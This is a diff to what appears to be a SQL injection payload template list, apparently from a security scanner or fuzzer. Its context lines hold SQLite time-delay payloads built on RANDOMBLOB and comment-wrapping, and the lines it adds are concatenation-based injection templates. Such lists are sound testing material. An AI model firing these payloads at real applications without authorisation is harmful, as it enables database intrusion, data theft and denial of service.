@@ -44,3 +44,7 @@ RANDOMBLOB(1000000000/2)
 AND 2947=LIKE({quote}ABCDEFG{quote},UPPER(HEX(RANDOMBLOB(1000000000/2))))
 OR 2947=LIKE({quote}ABCDEFG{quote},UPPER(HEX(RANDOMBLOB(1000000000/2))))
 {sqli}/*{quote} or {sqli} or {quote}{quote} or {sqli} or {quote}*/
+||{sqli}
+||{sqli}{comment}
+{quote}||{sqli}
+{quote}||{sqli}{comment}
